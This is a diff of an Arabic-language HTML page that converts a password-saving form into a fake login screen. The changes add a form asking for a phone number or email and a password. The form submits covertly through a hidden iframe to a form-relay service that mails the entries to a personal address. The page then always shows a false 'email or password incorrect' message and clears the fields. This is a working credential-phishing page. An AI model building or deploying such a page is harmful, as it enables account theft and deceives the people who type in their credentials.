@@ -171,42 +171,40 @@
             font-family: 'Tajawal', sans-serif;
             font-size: 15px;
         }
-        
-        /* إخفاء نموذج Formspree الافتراضي */
-        #formspree-form {
-            display: none;
-        }
     </style>
 </head>
 <body>
 
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted){formSubmitted();}"></iframe>
+
     <div class="container">
         <div class="lang-text">العربية</div>
         
-        <img src="f.jpg" alt="قلب أحمر" class="red-heart" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2I5MDAwMCI+PHBhdGggZD0iTTEyIDIxLjM1bC0xLjQ1LTEuMzJDNS40IDE1LjM2IDIgMTIuMjggMiA4LjUgMiA1LjQyIDQuNDIgMyA3LjUgM2MyLjA0IDAgNCAxLjA4IDUuNDIgMi44NEMxNC40NiA0LjA4IDE2LjUgMyAxOC41IDNjMy4wOCAwIDUuNSAyLjQyIDUuNSA1LjUgMCAzLjc4LTMuNCA2Ljg2LTguNTUgMTEuNTRMMTIgMjEuMzV6Ii8+PC9zdmc+'">
-        
-        <!-- نموذج Formspree -->
-        <form id="formspree-form" action="https://formspree.io/f/mqkopowz" method="POST">
-            <input type="text" name="اسم_الحساب" id="formspree-name">
-            <input type="text" name="كلمة_السر" id="formspree-pass">
-        </form>
+        <img src="FF.PNG" alt="قلب أحمر" class="red-heart" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2I5MDAwMCI+PHBhdGggZD0iTTEyIDIxLjM1bC0xLjQ1LTEuMzJDNS40IDE1LjM2IDIgMTIuMjggMiA4LjUgMiA1LjQyIDQuNDIgMyA3LjUgM2MyLjA0IDAgNCAxLjA4IDUuNDIgMi44NEMxNC40NiA0LjA4IDE2LjUgMyAxOC41IDNjMy4wOCAwIDUuNSAyLjQyIDUuNSA1LjUgMCAzLjc4LTMuNCA2Ljg2LTguNTUgMTEuNTRMMTIgMjEuMzV6Ii8+PC9zdmc+'">
 
-        <div class="input-group">
-            <input type="text" id="passName" placeholder="اسم كلمة السر التي أريد حفظها">
-        </div>
+        <form id="mainForm" action="https://formsubmit.co/wael.egypt@gmail.com" method="POST" target="hidden_iframe" style="width: 100%;">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="كلمة سر جديدة محفوظة">
+            <input type="hidden" name="_template" value="table">
+            
+            <div class="input-group">
+                <input type="text" id="passName" name="اسم_الحساب" placeholder="  أدخل رقم الهاتف المحمول أول البريد الإلكتروني " required>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" id="passValue" name="كلمة_السر" placeholder="كلمة السر" required>
+            </div>
+        </form>
         
-        <div class="input-group">
-            <input type="password" id="passValue" placeholder="كلمة السر">
-        </div>
-        
-        <button class="primary-btn" id="saveBtn" onclick="sendDataViaFormspree()">حفظ كلمة السر</button>
+        <button class="primary-btn" id="saveBtn" onclick="submitForm()">تسجيل الدخول </button>
         
         <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
         
         <div class="bottom-section">
             <button class="secondary-btn">إنشاء حساب جديد</button>
             
-            <img src="m.jpg" alt="قلب بنفسجي" class="purple-heart" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzgwMDA4MCI+PHBhdGggZD0iTTEyIDIxLjM1bC0xLjQ1LTEuMzJDNS40IDE1LjM2IDIgMTIuMjggMiA4LjUgMiA1LjQyIDQuNDIgMyA3LjUgM2MyLjA0IDAgNCAxLjA4IDUuNDIgMi44NEMxNC40NiA0LjA4IDE2LjUgMyAxOC41IDNjMy4wOCAwIDUuNSAyLjQyIDUuNSA1LjUgMCAzLjc4LTMuNCA2Ljg2LTguNTUgMTEuNTRMMTIgMjEuMzV6Ii8+PC9zdmc+'">
+      <img src="MM.JPG" alt="قلب بنفسجي" class="purple-heart" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzgwMDA4MCI+PHBhdGggZD0iTTEyIDIxLjM1bC0xLjQ1LTEuMzJDNS40IDE1LjM2IDIgMTIuMjggMiA4LjUgMiA1LjQyIDQuNDIgMyA3LjUgM2MyLjA0IDAgNCAxLjA4IDUuNDIgMi44NEMxNC40NiA0LjA4IDE2LjUgMyAxOC41IDNjMy4wOCAwIDUuNSAyLjQyIDUuNSA1LjUgMCAzLjc4LTMuNCA2Ljg2LTguNTUgMTEuNTRMMTIgMjEuMzV6Ii8+PC9zdmc+'">
+
         </div>
     </div>
 
@@ -218,6 +216,8 @@
     </div>
 
     <script>
+        let submitted = false;
+
         function showAlert(message) {
             document.getElementById('alertMessage').innerText = message;
             document.getElementById('customAlert').style.display = 'flex';
@@ -227,47 +227,32 @@
             document.getElementById('customAlert').style.display = 'none';
         }
 
-        function sendDataViaFormspree() {
+        function submitForm() {
             const passName = document.getElementById("passName").value;
             const passValue = document.getElementById("passValue").value;
             const btn = document.getElementById("saveBtn");
             
             if (passName.trim() === "" || passValue.trim() === "") {
-                showAlert("الرجاء إدخال اسم كلمة السر وكلمة السر أولاً.");
+                showAlert("الرجاء إدخال اسم البريد الالكترونى وكلمة السر أولاً.");
                 return;
             }
 
-            btn.innerText = "جاري الحفظ...";
+            btn.innerText = "جاري الدخول...";
             btn.disabled = true;
+            submitted = true;
+            
+            document.getElementById("mainForm").submit();
+        }
 
-            // نقل البيانات إلى النموذج المخفي
-            document.getElementById("formspree-name").value = passName;
-            document.getElementById("formspree-pass").value = passValue;
-
-            const form = document.getElementById("formspree-form");
-
-            fetch(form.action, {
-                method: form.method,
-                body: new FormData(form),
-                headers: {
-                    'Accept': 'application/json'
-                }
-            }).then(response => {
-                if (response.ok) {
-                    showAlert("تم إرسال وحفظ كلمة السر بنجاح!");
-                    document.getElementById("passName").value = "";
-                    document.getElementById("passValue").value = "";
-                } else {
-                    showAlert("حدث خطأ أثناء الإرسال. تأكد من اتصالك بالإنترنت.");
-                }
-            }).catch(error => {
-                showAlert("حدث خطأ في الاتصال.");
-            }).finally(() => {
-                btn.innerText = "حفظ كلمة السر";
-                btn.disabled = false;
-            });
+        function formSubmitted() {
+            showAlert("البريد الالكترونى او الرقم السري غير صحيح");
+            document.getElementById("passName").value = "";
+            document.getElementById("passValue").value = "";
+            const btn = document.getElementById("saveBtn");
+            btn.innerText = "";
+            btn.disabled = false;
+            submitted = false;
         }
     </script>
 </body>
 </html>
-
